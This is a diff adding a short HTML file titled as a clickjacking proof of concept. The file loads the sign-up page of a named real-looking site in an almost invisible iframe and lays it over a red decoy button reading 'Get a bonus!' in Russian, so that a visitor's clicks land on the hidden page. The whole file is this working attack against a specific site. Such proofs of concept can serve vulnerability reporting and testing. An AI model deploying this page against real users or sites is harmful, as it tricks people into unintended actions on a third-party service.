@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Clickjacking PoC</title>
+  <style>
+    iframe {
+      opacity: 0.01;
+      position: absolute;
+      top: 50px;
+      left: 50px;
+      width: 800px;
+      height: 600px;
+      z-index: 2;
+    }
+
+    .bait-button {
+      position: absolute;
+      top: 50px;
+      left: 50px;
+      z-index: 1;
+      background: red;
+      color: white;
+      padding: 20px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="bait-button">Получить бонус!</div>
+  <iframe src="https://bumba.academy/sign-up/name" frameborder="0"></iframe>
+</body>
+</html>
